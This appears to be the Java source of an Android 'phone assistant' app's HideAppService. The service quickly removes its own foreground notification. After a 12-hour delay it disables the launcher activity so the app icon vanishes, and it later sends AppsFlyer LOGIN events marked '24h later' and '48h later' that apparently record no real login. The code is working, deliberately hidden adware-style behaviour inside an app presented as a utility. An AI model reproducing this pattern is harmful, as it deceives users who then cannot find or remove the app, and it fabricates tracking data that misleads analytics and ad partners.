package com.sharkwang8.phoneassistant.service;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.support.annotation.Nullable;

import com.appsflyer.AFInAppEventParameterName;
import com.appsflyer.AFInAppEventType;
import com.appsflyer.AppsFlyerLib;

import java.util.HashMap;
import java.util.Map;

/**
 * @author heguogui
 * @version v 1.0.0
 * @describe 隐藏图标 服务
 * @date 2018/11/30
 * @email 252774645@qq.com
 */
public class HideAppService extends IntentService {
    private static final String TAG =HideAppService.class.getName();
    public HideAppService() {
        super("HideAppService");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try{
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
                NotificationChannel channel = new NotificationChannel("id","name", NotificationManager.IMPORTANCE_LOW);
                final NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                manager.createNotificationChannel(channel);
                Notification notification = new Notification.Builder(getApplicationContext(),"id").build();
                startForeground(100, notification);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        // 延迟1s
                        SystemClock.sleep(1000);
                        stopForeground(true);
                        // 移除Service弹出的通知
                        manager.cancel(100);
                    }
                }).start();
            }
        }catch (Exception e) {

        }

    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        long delay = 43200000l;//12小时
        SystemClock.sleep(delay);//12小时后桌面图标影藏
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName("com.sharkwang8.phoneassistant",
                "com.sharkwang8.phoneassistant.main.MainActivity"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);//影藏图标
        //added by Shurrik
        SystemClock.sleep(delay);//24小时后
        Map<String, Object> eventValues = new HashMap<>();
        eventValues.put(AFInAppEventParameterName.CONTENT, "24h later");
        AppsFlyerLib.getInstance().trackEvent(HideAppService.this, AFInAppEventType.LOGIN, eventValues);
        SystemClock.sleep(delay * 2);//48小时后
        eventValues.clear();
        eventValues.put(AFInAppEventParameterName.CONTENT, "48h later");
        AppsFlyerLib.getInstance().trackEvent(HideAppService.this, AFInAppEventType.LOGIN, eventValues);

    }
}
